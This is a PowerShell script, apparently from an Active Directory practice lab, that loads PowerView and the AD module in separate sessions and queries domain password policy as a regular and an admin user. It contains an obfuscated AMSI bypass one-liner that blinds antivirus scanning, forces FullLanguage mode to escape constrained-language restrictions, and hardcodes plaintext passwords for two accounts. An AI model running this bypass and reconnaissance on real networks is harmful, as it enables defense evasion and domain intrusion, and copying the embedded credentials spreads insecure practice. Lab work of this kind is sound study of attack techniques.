# Define credentials
$securePassword_regular = ConvertTo-SecureString "sexywolfy" -AsPlainText -Force
$credential_regular = New-Object System.Management.Automation.PSCredential("robb.stark", $securePassword_regular)

$securePassword_admin = ConvertTo-SecureString "iamthekingoftheworld" -AsPlainText -Force
$credential_admin = New-Object System.Management.Automation.PSCredential("robert.baratheon", $securePassword_admin)

# Create new named sessions
$AD_Module_session = New-PSSession -Name "ADModule"
$PV_Session = New-PSSession -Name "PowerView"

Invoke-Command -Session $AD_Module_session -ScriptBlock {
    # Set Execution Policy to unrestricted
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -ErrorAction Stop

    # Unblock and import AD modules
    Unblock-File ./ADModule/Microsoft.ActiveDirectory.Management.dll -ErrorAction Stop
    Unblock-File ./ADModule/ActiveDirectory/ActiveDirectory.psd1 -ErrorAction Stop
    Import-Module ./ADModule/Microsoft.ActiveDirectory.Management.dll -Verbose -ErrorAction Stop
    Import-Module ./ADModule/ActiveDirectory/ActiveDirectory.psd1 -Verbose -ErrorAction Stop

    # Get-ADDomain
    try {
        Write-Output "Verifying AD module installation with Get-ADDomain..."
        Get-ADDomain -ErrorAction Stop
    } catch {
        Write-Output "AD Module verification failed. Get-ADDomain could not be run: $_"
    }
}

# Run commands in the PowerView session
Invoke-Command -Session $PV_Session -ScriptBlock {
    # Set Execution Policy to Full Language Mode
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -ErrorAction Stop
    $ExecutionContext.SessionState.LanguageMode = "FullLanguage"
    
    # AMSI Bypass
    [Ref]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))

    Unblock-File ./PowerView/PowerView.ps1 -ErrorAction Stop
    Import-Module ./PowerView/PowerView.ps1 -Verbose -ErrorAction Stop
    
    # Get-Netdomain
    try {
        Write-Output "Verifying PowerView installation with Get-NetDomain..."
        Get-NetDomain -ErrorAction Stop
    } catch {
        Write-Output "PowerView verification failed. Get-NetDomain could not be run: $_"
    }
}

Read-Host "Press Enter to run Get-ADDefaultDomainPasswordPolicy for ADModule as robb.stark"

Invoke-Command -Session $AD_Module_session -ScriptBlock {
    try {
        Get-ADDefaultDomainPasswordPolicy -Credential $using:credential_regular -ErrorAction Stop
    } catch {
        $_  # Output the error message directly
    }
}

Read-Host "Press Enter to run (Get-DomainPolicy).SystemAccess for PowerView as robb.stark"

Invoke-Command -Session $PV_Session -ScriptBlock {
    try {
        (Get-DomainPolicy -Credential $using:credential_regular).SystemAccess
    } catch {
        $_  # Output the error message directly
    }
}

Read-Host "Press Enter to run Get-ADDefaultDomainPasswordPolicy for ADmodule as robb.stark"

Invoke-Command -Session $AD_Module_session -ScriptBlock {
    try {
        Get-ADDefaultDomainPasswordPolicy -Credential $using:credential_admin -ErrorAction Stop
    } catch {
        $_  # Output the error message directly
    }
}

Read-Host "Press Enter to run (Get-DomainPolicy).SystemAccess for PowerView as robert.baratheon"

Invoke-Command -Session $PV_Session -ScriptBlock {
    try {
        (Get-DomainPolicy -Credential $using:credential_admin).SystemAccess
    } catch {
        $_  # Output the error message directly
    }
}